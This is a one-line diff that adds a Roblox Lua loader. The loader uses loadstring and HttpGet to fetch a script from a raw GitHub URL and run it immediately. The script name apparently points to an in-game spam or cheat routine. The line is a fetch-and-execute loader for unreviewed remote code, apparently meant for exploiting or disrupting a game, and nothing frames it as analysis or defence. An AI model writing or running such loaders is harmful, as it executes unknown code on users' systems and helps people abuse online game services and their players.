@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/rally-wrong-way-spam4-ihxre839f79y2b.lua"))()
